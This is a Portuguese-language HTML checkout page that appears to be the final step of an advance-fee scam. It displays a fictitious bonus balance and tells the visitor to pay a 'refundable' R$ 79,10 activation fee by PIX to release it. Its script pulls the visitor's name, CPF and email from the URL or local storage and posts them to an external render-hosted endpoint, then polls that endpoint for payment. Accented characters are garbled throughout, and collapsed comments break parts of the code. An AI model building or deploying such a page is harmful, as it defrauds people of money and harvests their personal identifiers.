<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Resumo Final</title>
    <style>
        /* Estilos Fi√©is ao Design / * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; } body { background-color: #f7f7f7; padding: 20px; display: flex; justify-content: center; } .container { background: #fff; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; position: relative; border: 1px solid #eee; } .header { background: #fff; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f0f0f0; } .header h1 { font-size: 18px; color: #333; } .balance-pill { background: #000; color: #fff; padding: 5px 12px; border-radius: 20px; font-size: 14px; font-weight: bold; } .alert-box { background: #fff5f2; border-left: 4px solid #ee4d2d; margin: 15px; padding: 15px; border-radius: 4px; } .alert-box h2 { font-size: 20px; color: #333; margin-bottom: 5px; } .alert-box p { font-size: 13px; color: #666; line-height: 1.4; } .section-title { font-size: 14px; font-weight: bold; color: #444; margin: 20px 15px 10px; text-transform: uppercase; } .data-card { background: #f9f9f9; margin: 0 15px; padding: 15px; border-radius: 8px; border: 1px solid #eee; } .input-group { margin-bottom: 12px; } .input-group label { display: block; font-size: 11px; font-weight: bold; color: #888; margin-bottom: 4px; } .input-readonly { width: 100%; border: none; background: transparent; font-size: 15px; color: #333; font-weight: 500; outline: none; } .values-card { margin: 20px 15px; border-top: 1px solid #eee; padding-top: 15px; } .value-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; } .value-row.total { margin-top: 15px; padding-top: 10px; border-top: 1px solid #f0f0f0; color: #ee4d2d; font-weight: bold; font-size: 18px; } / Sacada de Ac√∫mulo de B√¥nus */
        .bonus-add {
            color: #1f9c6b;
            font-size: 12px;
            font-weight: bold;
            background: #e8f5e9;
            padding: 2px 6px;
            border-radius: 4px;
            margin-left: 5px;
        }

        .cta-btn {
            width: calc(100% - 30px);
            margin: 20px 15px;
            background: #ee4d2d;
            color: #fff;
            border: none;
            padding: 18px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(238, 77, 45, 0.3);
            transition: 0.2s;
        }

        .cta-btn:active {
            transform: scale(0.98);
        }

        #pix_area {
            display: none;
            text-align: center;
            padding: 20px;
            animation: fadeIn 0.5s;
        }

        #pix_area img {
            width: 200px;
            margin-bottom: 15px;
            border: 1px solid #eee;
        }

        .copy-btn {
            background: #fff;
            border: 1px solid #ee4d2d;
            color: #ee4d2d;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>Resumo Final</h1>
            <div class="balance-pill">R$ 1.487,93</div>
        </div>
        <div class="alert-box">
            <h2>Consolida√ß√£o de valores</h2>
            <p>Confirme seus dados abaixo para liberar a sua bonifica√ß√£o instantaneamente.</p>
        </div>
        <div class="section-title">Seus Dados</div>
        <div class="data-card">
            <div class="input-group"> <label>NOME COMPLETO</label> <input type="text" id="nome" class="input-readonly"
                    readonly> </div>
            <div class="input-group"> <label>CPF</label> <input type="text" id="cpf" class="input-readonly" readonly>
            </div>
            <div class="input-group"> <label>E-MAIL</label> <input type="text" id="email" class="input-readonly"
                    readonly> </div>
        </div>
        <div class="values-card" id="resumo_financeiro">
            <div class="value-row"> <span>Saldo Bruto Inicial</span> <strong>R$ 1.342,03</strong> </div>
            <div class="value-row"> <span>Taxas Revertidas em B√¥nus</span> <strong>R$ 66,80 <span
                        class="bonus-add">SOMADO</span></strong> </div>
            <div class="value-row"> <span>Taxa de Ativa√ß√£o Final (79,10)</span> <strong>R$ 79,10 <span
                        class="bonus-add">REEMBOLS√ÅVEL</span></strong> </div>
            <div class="value-row" style="margin-top: 10px; font-size: 12px; font-style: italic; color: #888;">
                <span>C√°lculo: 1.342,03 + 27,90 + 38,90 + 79,10</span> </div>
            <div class="value-row total"> <span>VALOR TOTAL LIBERADO</span> <strong>R$ 1.487,93</strong> </div>
        </div>
        <div id="pix_area">
            <h3 style="color:#1f9c6b; margin-bottom:10px;">‚úÖ QR CODE GERADO</h3> <img id="qr_img" src="">
            <div id="pix_code"
                style="font-size: 10px; background: #f4f4f4; padding: 10px; word-break: break-all; margin-bottom: 15px;">
            </div> <button class="copy-btn" onclick="copiarPix()">COPIAR C√ìDIGO PIX</button>
        </div> <button class="cta-btn" id="btn_pagar" onclick="gerarPixFinal()">PROSSEGUIR PARA PAGAMENTO</button>
        <div style="text-align: center; font-size: 11px; color: #aaa; margin-bottom: 20px;"> üîí Pagamento processado
            pela Vizzion Pay </div>
    </div>
    <script> // 1. CAPTURA AUTOM√ÅTICA (URL ou LocalStorage) function carregarDados() { const urlParams = new URLSearchParams(window.location.search); const stored = JSON.parse(localStorage.getItem('dadosUsuario') || '{}'); const finalNome = urlParams.get('nome') || stored.nome || "N√£o informado"; const finalCpf = urlParams.get('cpf') || stored.cpf || stored.documento || "N√£o informado"; const finalEmail = urlParams.get('email') || stored.email || "N√£o informado"; document.getElementById('nome').value = finalNome; document.getElementById('cpf').value = finalCpf; document.getElementById('email').value = finalEmail; } window.onload = carregarDados; // 2. GERA√á√ÉO DE PIX (79,10) function gerarPixFinal() { const btn = document.getElementById('btn_pagar'); btn.innerText = "GERANDO PIX..."; btn.disabled = true; const dados = { nome: document.getElementById('nome').value, cpf: document.getElementById('cpf').value.replace(/\D/g, ''), email: document.getElementById('email').value, valor: "79.10" // TAXA FINAL }; fetch("https://checkout-pix-profissional.onrender.com/pix", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(dados) }) .then(res => res.json()) .then(data => { if(data.success) { document.getElementById('resumo_financeiro').style.display = 'none'; document.getElementById('pix_area').style.display = 'block'; document.getElementById('qr_img').src = data.encodedImage.startsWith('http') ? data.encodedImage : data:image/png;base64,${data.encodedImage}; document.getElementById('pix_code').innerText = data.payload; btn.style.display = 'none'; window.pixPayload = data.payload; // 3. MONITORAMENTO (Para pular para o final do funil) if(data.transactionId) { setInterval(() => { fetch(https://checkout-pix-profissional.onrender.com/check-status/${data.transactionId}) .then(r => r.json()) .then(st => { if(st.paid) window.location.href = "PAGINA_DE_SUCESSO_FINAL.html"; }); }, 3000); } } }); } function copiarPix() { navigator.clipboard.writeText(window.pixPayload); alert("C√≥digo PIX copiado!"); } </script>
</body>

</html>
